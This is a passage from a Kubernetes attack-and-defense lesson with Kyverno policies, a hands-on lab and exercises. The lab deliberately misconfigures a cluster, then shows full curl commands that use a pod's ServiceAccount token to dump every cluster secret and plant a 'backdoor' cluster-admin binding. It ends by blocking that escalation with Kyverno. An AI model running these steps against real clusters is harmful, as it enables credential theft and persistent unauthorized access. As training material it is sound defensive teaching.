kubectl -n falco logs -l app.kubernetes.io/name=falco -f
# 22:14:03.000000000: Warning Sensitive file opened for reading by non-trusted program
16.3 kubectl-who-can

Fast, focused RBAC introspection — pointed at any verb/resource, tells you every subject that can do it. Blue teams should have a nightly report for the top 20 dangerous verbs.
16.4 Admission controllers

OPA/Gatekeeper and Kyverno are the two production choices in 2026. They stop bad objects before they reach etcd.
# Kyverno: block privileged pods
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged
spec:
  validationFailureAction: Enforce
  rules:
    - name: disallow-privileged
      match:
        any:
          - resources:
              kinds: ["Pod"]
      validate:
        message: "Privileged containers are not allowed."
        pattern:
          spec:
            containers:
              - =(securityContext):
                  =(privileged): "false"
17. Hands-On Lab

Objective: Spin up a kind cluster, deploy a pod with an automounted default ServiceAccount, escalate to cluster-admin from inside the pod, then install a Kyverno policy that blocks the escalation and prove that the same exploit no longer works.
17.1 Cluster and workload
kind create cluster --name attack-lab --image kindest/node:v1.29.4

# Deliberately misconfigured: bind cluster-admin to default:default (DO NOT DO THIS IN PROD)
kubectl create clusterrolebinding oops \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default

# Deploy a pod that mounts its ServiceAccount token:
kubectl run victim --image=alpine --restart=Never -- sleep 1d
kubectl wait pod/victim --for=condition=Ready --timeout=60s
kubectl exec -it victim -- sh
17.2 Escalation from inside the pod
# Inside the pod:
apk add --no-cache curl jq

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://kubernetes.default.svc

# Confirm identity:
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1",
       "spec":{"resourceAttributes":{"verb":"*","resource":"*"}}}'
# "status": { "allowed": true }

# Dump every secret in the cluster:
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/secrets" | jq -r '.items[] |
    "\(.metadata.namespace)/\(.metadata.name)\t\(.type)"'
# kube-system/bootstrap-token-abcdef   bootstrap.kubernetes.io/token
# kube-system/kube-controller-manager  ...
# ...

# Create your own permanent backdoor ClusterRoleBinding:
cat > crb.json <<'JSON'
{"apiVersion":"rbac.authorization.k8s.io/v1","kind":"ClusterRoleBinding",
 "metadata":{"name":"backdoor"},
 "subjects":[{"kind":"User","name":"attacker","apiGroup":"rbac.authorization.k8s.io"}],
 "roleRef":{"kind":"ClusterRole","name":"cluster-admin",
            "apiGroup":"rbac.authorization.k8s.io"}}
JSON
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -X POST \
  "$API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" \
  -d @crb.json
17.3 Install Kyverno and block the pattern
# Back on the host:
helm repo add kyverno https://kyverno.github.io/kyverno/
helm install kyverno kyverno/kyverno -n kyverno --create-namespace
kubectl -n kyverno wait --for=condition=Available deploy --all --timeout=180s

# Policy: forbid ClusterRoleBinding subjects that are default SAs to powerful roles.
cat <<'YAML' | kubectl apply -f -
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: forbid-default-sa-cluster-admin
spec:
  validationFailureAction: Enforce
  background: false
  rules:
    - name: forbid-default-sa-cluster-admin
      match:
        any:
          - resources:
              kinds: ["ClusterRoleBinding"]
      validate:
        message: "Do not bind cluster-admin to a default ServiceAccount."
        deny:
          conditions:
            all:
              - key: "{{ request.object.roleRef.name }}"
                operator: Equals
                value: "cluster-admin"
              - key: "default"
                operator: AnyIn
                value: "{{ request.object.subjects[?kind=='ServiceAccount'].name }}"
YAML
17.4 Confirm the exploit is now blocked
# Delete the malicious binding first:
kubectl delete clusterrolebinding oops

# Try to recreate it — Kyverno rejects:
kubectl create clusterrolebinding oops \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default
# Error from server: admission webhook "validate.kyverno.svc-fail" denied the request:
# resource ClusterRoleBinding/oops was blocked due to the following policies:
# forbid-default-sa-cluster-admin:
#   forbid-default-sa-cluster-admin: Do not bind cluster-admin to a default ServiceAccount.
17.5 Tear down
kind delete cluster --name attack-lab
18. Exercises
18.1 Guided

    Enumerate a stranger cluster. Boot a k3s node and, from your workstation, run kube-hunter --remote <ip> in passive mode. Explain each finding and map it to a section of this lesson.
    Read etcd from disk. In a kubeadm lab install, stop the etcd static pod, copy /var/lib/etcd/member/snap/db off the node, and use etcd-dump-db to list the keys. Confirm whether Secrets are encrypted.
    Chain a HostPath mount. Deploy a pod with hostPath: /var/lib/kubelet mounted read-write and, from inside, dump every ServiceAccount token cached on the node.

18.2 Independent

    Build a minimal RBAC that lets a namespace admin do everything except create ClusterRoleBindings, mount hostPaths, or set privileged: true. Verify with kubectl auth can-i.
    Write a Kyverno policy that blocks any pod attempting to mount 169.254.169.254 via hostAliases or a hostNetwork-side channel, and prove that a naive IMDS-abuse pod is rejected.
    Given a running cluster and only anonymous access to https://<master>:6443/version, produce a written report of every conclusion you can draw about the cluster (distribution, version, patch level, likely cloud, likely CNI) and how you drew it. Do not use kubectl.

19. Summary and Next Lesson

Kubernetes is a distributed operating system, and like any OS it has an ABI (the API server), a filesystem (etcd), an init (the controller-manager), a scheduler, and a privilege model (RBAC). Every attack path is one of three shapes:

    Reach a pod, escalate through its ServiceAccount.
    Reach the control plane, read etcd.
    Reach the pipeline that reaches the control plane.

Every defense is one of four shapes:

    Turn off anonymous.
    Tighten RBAC.
